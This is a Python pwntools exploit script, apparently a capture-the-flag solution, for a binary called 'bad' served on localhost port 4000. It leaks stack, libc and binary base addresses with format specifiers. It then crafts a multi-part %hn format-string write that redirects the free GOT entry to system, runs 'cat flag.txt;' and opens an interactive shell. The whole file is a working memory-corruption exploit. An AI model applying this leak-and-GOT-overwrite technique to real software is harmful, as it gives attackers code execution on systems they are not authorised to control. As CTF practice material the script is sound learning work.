#!/usr/bin/env python3

from pwn import *

exe = ELF("./bad")
exe_patched = ELF("./bad_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.37.so")

context.binary = exe

r = None

def conn():
    global r
    if args.LOCAL:
        r = process([exe_patched.path])
        #r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path}) #if patched binary does not work - exe is original one
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 4000)


def write_payload(value, written, offset, byte_num):
    payload = b""
    limit = 0x100
    byte_fmt = "hhn"
    if(byte_num > 1):
        limit = 0x10000
        byte_fmt = "hn"

    value = value % limit
    written += offset

    print(f"[*] LIMIT {hex(limit)}, WRITTEN {hex(written)}, VALUE {hex(value)}")
    if value < (written % limit):
        print(f"[*] LIMIT {hex(limit)}, WRITTEN {hex(written)}, VALUE {hex(value)}")
        byte_to_write = (limit - (written % limit)) + value
    else:
        byte_to_write = value - (written % limit)

    print(f"[*] Written so far: {hex(written)}, writing {hex(byte_to_write)}")

    for o in range(offset):
        payload += b"%c"#For skipping

    if byte_num == 3:
        payload += "%{bt}c|0x%016lx".format(bt=byte_to_write).encode()
    else:
        payload += "%{bt}c%{fmt}".format(bt=byte_to_write, fmt=byte_fmt).encode()
    #payload += "%{bt}c%{fmt}".format(bt=byte_to_write, fmt=byte_fmt).encode()

    print(f"[*] Payload: {payload}\n")

    written += byte_to_write

    return (written, payload)

def get_writes(writes, already_written = 0):
    written_bytes = already_written
    payload = b""
    last_off = 0
    for write in writes:
        current_offset = write['off'] - last_off
        if(current_offset < 2):
            print("[!] Incorrect offset!! aborting")
            exit(-1)

        (w, p) = write_payload(value=write['val'], written=written_bytes,
                               offset=(current_offset - 2), byte_num=write['byte_num'])
        last_off = write['off']
        written_bytes = w
        payload += p

    return payload

def main():
    conn()
    # good luck pwning :)

    #rsp starts at %7$p
    r.recvuntil(b"try it: ")
    r.sendline(b"%8$p|%3$p|%9$p")
    resp = r.recvline()[:-1]
    print(resp)
    rbp_addr = int(resp.split(b"|")[0], base=16)
    libc_base = int(resp.split(b"|")[1], base=16) - 0x10b941
    system = libc_base + 0x4ebf0
    bin_base = int(resp.split(b"|")[2], base=16) - 0x1248

    #
    print(f"RBP addr: {hex(rbp_addr)}")
    print(f"Libc base: {hex(libc_base)}")
    print(f"System: {hex(system)}")
    print(f"Binary base: {hex(bin_base)}")

    r.recvuntil(b"try it: ")

    free_got_off = 0x4000
    #offset 8 -> init RBP
    #offset 10 - will point to got victim at

    #first overwrite at offset +1 since we need to overwrite 3 bytes
    cmd = b"cat flag.txt;"
    payload = cmd

    writes = [
        {"val":rbp_addr + 0x60, "off":8, "byte_num":2},
        {"val":(bin_base + free_got_off + 1) & 0xffff, "off":10, "byte_num":2},
        {"val":(system >> 8) & 0xffff, "off":22, "byte_num":2},
    ]

    if args.DOCKER:
        writes += [
            {"val":rbp_addr + 0x198, "off":29, "byte_num":2},
            {"val":(bin_base + free_got_off) & 0xffff, "off":47, "byte_num":2},
            {"val":(system & 0xffff), "off":61, "byte_num":2},
        ]
    else:
        writes += [
            {"val":rbp_addr + 0x3c0, "off":29, "byte_num":2},
            {"val":(bin_base + free_got_off) & 0xffff, "off":47, "byte_num":2},
            {"val":(system & 0xffff), "off":130, "byte_num":2},
        ]

    payload += get_writes(writes, already_written=len(cmd))

    #payload = b"%c%c%c%c%c%c%c%n"
    r.sendline(payload)
    #print(payload)
    #payload = b"AAAAAAAA%8$hhn"
    #r.sendline(payload)
    #binary_base = X - 0x1248

    r.interactive()


if __name__ == "__main__":
    main()
